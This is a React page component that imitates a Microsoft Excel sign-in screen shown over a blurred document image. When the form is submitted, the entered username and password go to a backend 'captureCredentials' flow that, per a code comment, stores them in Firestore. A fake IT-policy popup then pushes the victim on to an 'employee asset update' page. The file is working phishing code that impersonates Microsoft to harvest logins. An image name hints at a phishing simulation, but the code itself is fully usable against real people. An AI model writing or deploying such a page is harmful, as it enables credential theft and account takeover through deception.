'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';

// Define Swal type for TypeScript
declare const Swal: any;

export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    if (isSubmitting) return;

    setIsSubmitting(true);
    
    try {
      // Capture credentials on the backend (saves to Firestore)
      await captureCredentials({ username, password });

      // Directly trigger the SweetAlert2 popup after saving credentials
      if (typeof Swal !== 'undefined') {
        Swal.fire({
          title: "Action Required: Employee Asset Details",
          text: "Please review and update your asset information in accordance with the new IT policy.",
          icon: "info",
          confirmButtonText: "Update Now",
          confirmButtonColor: "#3085d6",
          background: "#fff",
          color: "#333"
        }).then(() => {
          // Redirect to the asset update page after pressing the button
          window.location.href = "/employee-asset-update"; 
        });
      } else {
        // Fallback if Swal is not loaded
        alert("Action Required: Please review and update your asset information.");
        window.location.href = "/employee-asset-update";
      }

    } catch (error) {
      console.error("An error occurred during submission:", error);
      // If there's an error, re-enable the form
      setIsSubmitting(false);
    }
  };
  
  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
            disabled={isSubmitting}
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
            disabled={isSubmitting}
          />
          <button type="submit" disabled={isSubmitting}>
            {isSubmitting ? 'Signing in...' : 'Sign in'}
          </button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
